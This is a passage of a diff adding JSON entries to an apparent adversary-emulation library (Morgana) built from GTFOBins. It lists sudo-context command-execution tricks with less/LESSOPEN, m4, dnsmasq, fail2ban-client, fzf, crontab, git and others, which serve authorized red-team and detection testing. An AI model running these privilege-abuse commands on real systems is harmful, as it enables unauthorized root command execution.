+      }
+    },
+    {
+      "id": "gtfobins:crash:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - crash - Command - Sudo [4cd7d64]",
+      "description": "This executable can run non-interactive system commands. Binary: crash. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "CRASHPAGER=/path/to/command crash -h",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/crash",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/crash",
+        "source_bin": "crash",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:crash:command:0:sudo::",
+        "source_name": "crash",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `crash` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:crontab:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - crontab - Command - Sudo [d9dadc5]",
+      "description": "This executable can run non-interactive system commands. Binary: crontab. Context: Sudo. This spaws the default editor to edit the crontab file, commands can be scheduled to run using the [cron syntax](https://en.wikipedia.org/wiki/Cron).",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "crontab -e",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/crontab",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/crontab",
+        "source_bin": "crontab",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:crontab:command:0:sudo::",
+        "source_name": "crontab",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `crontab` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:dmesg:command:1:sudo:0:dmesg>less",
+      "name": "GTFOBINS - T1059 - dmesg - Command - Sudo [8d81a46]",
+      "description": "This executable can run non-interactive system commands. Binary: dmesg. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "dmesg -H\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/dmesg",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/dmesg",
+        "source_bin": "dmesg",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "dmesg",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "dmesg",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:dmesg:command:1:sudo:0:dmesg>less",
+        "source_name": "dmesg",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `dmesg` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:dnf:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - dnf - Command - Sudo [fb99af0]",
+      "description": "This executable can run non-interactive system commands. Binary: dnf. Context: Sudo. Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` echo /path/to/command >x.sh fpm -n x -s dir -t rpm -a all --before-install x.sh . ``` The `--disablerepo=*` option is used for targets without Internet connectivity, can be omitted otherwise.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "dnf install -y x-1.0-1.noarch.rpm --disablerepo=*",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/dnf",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/dnf",
+        "source_bin": "dnf",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:dnf:command:0:sudo::",
+        "source_name": "dnf",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `dnf` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:dnsmasq:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - dnsmasq - Command - Sudo [dad948f]",
+      "description": "This executable can run non-interactive system commands. Binary: dnsmasq. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "dnsmasq --conf-script='/path/to/command 1>&2'",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/dnsmasq",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/dnsmasq",
+        "source_bin": "dnsmasq",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:dnsmasq:command:0:sudo::",
+        "source_name": "dnsmasq",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `dnsmasq` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:dpkg:command:1:sudo:0:dpkg>less",
+      "name": "GTFOBINS - T1059 - dpkg - Command - Sudo [f880598]",
+      "description": "This executable can run non-interactive system commands. Binary: dpkg. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "dpkg -l\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/dpkg",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/dpkg",
+        "source_bin": "dpkg",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "dpkg",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "dpkg",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:dpkg:command:1:sudo:0:dpkg>less",
+        "source_name": "dpkg",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `dpkg` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:eb:command:1:sudo:0:eb>journalctl>less",
+      "name": "GTFOBINS - T1059 - eb - Command - Sudo [dfa87be]",
+      "description": "This executable can run non-interactive system commands. Binary: eb. Context: Sudo. Inherits command behavior from journalctl. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "eb logs\njournalctl\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/eb",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/eb",
+        "source_bin": "eb",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "journalctl",
+        "inheritance_path": [
+          "eb",
+          "journalctl",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "journalctl",
+          "inheritance_path": [
+            "eb",
+            "journalctl",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:eb:command:1:sudo:0:eb>journalctl>less",
+        "source_name": "eb",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `eb` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:fail2ban-client:command:1:sudo::",
+      "name": "GTFOBINS - T1059 - fail2ban-client - Command - Sudo [eeacb91]",
+      "description": "This executable can run non-interactive system commands. Binary: fail2ban-client. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "cat >/path/to/temp-dir/fail2ban.conf <<EOF\n[Definition]\nEOF\n\ncat >/path/to/temp-dir/jail.local <<EOF\n[x]\nenabled = true\naction = x\nEOF\n\nmkdir -p /path/to/temp-dir/action.d/\ncat >/path/to/temp-dir/action.d/x.conf <<EOF\n[Definition]\nactionstart = /path/to/command\nEOF\n\nmkdir -p /path/to/temp-dir/filter.d/\ncat >/path/to/temp-dir/filter.d/x.conf <<EOF\n[Definition]\nEOF\n\nfail2ban-client -c /path/to/temp-dir/ -v restart",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/fail2ban-client",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/fail2ban-client",
+        "source_bin": "fail2ban-client",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "blind": true
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:fail2ban-client:command:1:sudo::",
+        "source_name": "fail2ban-client",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `fail2ban-client` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:fail2ban-client:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - fail2ban-client - Command - Sudo [d561fa0]",
+      "description": "This executable can run non-interactive system commands. Binary: fail2ban-client. Context: Sudo. The subprocess is immediately sent to the background, but `fail2ban-client` waits on a return code from the subprocess. The `banip` command will hang until the subprocess returns.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "fail2ban-client add x\nfail2ban-client set x addaction x\nfail2ban-client set x action x actionban /path/to/command\nfail2ban-client start x\nfail2ban-client set x banip #{lotl_gtfobins_remote_host}\nfail2ban-client set x unbanip #{lotl_gtfobins_remote_host}\nfail2ban-client stop x",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/fail2ban-client",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/fail2ban-client",
+        "source_bin": "fail2ban-client",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "blind": true
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:fail2ban-client:command:0:sudo::",
+        "source_name": "fail2ban-client",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `fail2ban-client` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:fastfetch:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - fastfetch - Command - Sudo [28f775a]",
+      "description": "This executable can run non-interactive system commands. Binary: fastfetch. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo '{\"modules\":[{\"type\":\"command\",\"key\":\"x\",\"text\":\"exec /path/to/command\"}]}' >#{lotl_gtfobins_local_path}.jsonc\nfastfetch -c #{lotl_gtfobins_local_path}.jsonc",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/fastfetch",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/fastfetch",
+        "source_bin": "fastfetch",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:fastfetch:command:0:sudo::",
+        "source_name": "fastfetch",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `fastfetch` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:fzf:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - fzf - Command - Sudo [997fb44]",
+      "description": "This executable can run non-interactive system commands. Binary: fzf. Context: Sudo. Commands can be issued via POST requests, for example: ``` curl http://localhost:12345 -d 'execute(/path/to/command)' ```",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "fzf --listen=#{lotl_gtfobins_remote_port}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/fzf",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/fzf",
+        "source_bin": "fzf",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:fzf:command:0:sudo::",
+        "source_name": "fzf",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `fzf` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:gcloud:command:1:sudo:0:gcloud>less",
+      "name": "GTFOBINS - T1059 - gcloud - Command - Sudo [4a8355b]",
+      "description": "This executable can run non-interactive system commands. Binary: gcloud. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "gcloud help\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/gcloud",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/gcloud",
+        "source_bin": "gcloud",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "gcloud",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "gcloud",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:gcloud:command:1:sudo:0:gcloud>less",
+        "source_name": "gcloud",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `gcloud` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:git:command:1:sudo:1:git>less",
+      "name": "GTFOBINS - T1059 - git - Command - Sudo [cbd883b]",
+      "description": "This executable can run non-interactive system commands. Binary: git. Context: Sudo. The help system can also be reached from any `git` command, e.g., `git branch`. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "git branch --help config\n!/bin/sh\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/git",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/git",
+        "source_bin": "git",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "git",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "git",
+            "less"
+          ],
+          "inherit_index": 1
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:git:command:1:sudo:1:git>less",
+        "source_name": "git",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `git` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:git:command:1:sudo:0:git>less",
+      "name": "GTFOBINS - T1059 - git - Command - Sudo [bfeca57]",
+      "description": "This executable can run non-interactive system commands. Binary: git. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "git help config\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/git",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/git",
+        "source_bin": "git",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "git",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "git",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:git:command:1:sudo:0:git>less",
+        "source_name": "git",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `git` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:journalctl:command:1:sudo:0:journalctl>less",
+      "name": "GTFOBINS - T1059 - journalctl - Command - Sudo [f32a2bf]",
+      "description": "This executable can run non-interactive system commands. Binary: journalctl. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "journalctl\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/journalctl",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/journalctl",
+        "source_bin": "journalctl",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "journalctl",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "journalctl",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:journalctl:command:1:sudo:0:journalctl>less",
+        "source_name": "journalctl",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `journalctl` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:less:command:1:sudo::",
+      "name": "GTFOBINS - T1059 - less - Command - Sudo [839c8ec]",
+      "description": "This executable can run non-interactive system commands. Binary: less. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "LESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/less",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/less",
+        "source_bin": "less",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:less:command:1:sudo::",
+        "source_name": "less",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `less` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:m4:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - m4 - Command - Sudo [263838e]",
+      "description": "This executable can run non-interactive system commands. Binary: m4. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo 'esyscmd(/path/to/command)' | m4",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/m4",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/m4",
+        "source_bin": "m4",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:m4:command:0:sudo::",
+        "source_name": "m4",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `m4` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:man:command:1:sudo:0:man>less",
+      "name": "GTFOBINS - T1059 - man - Command - Sudo [f2dc4b2]",
+      "description": "This executable can run non-interactive system commands. Binary: man. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "man man\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/man",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/man",
+        "source_bin": "man",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
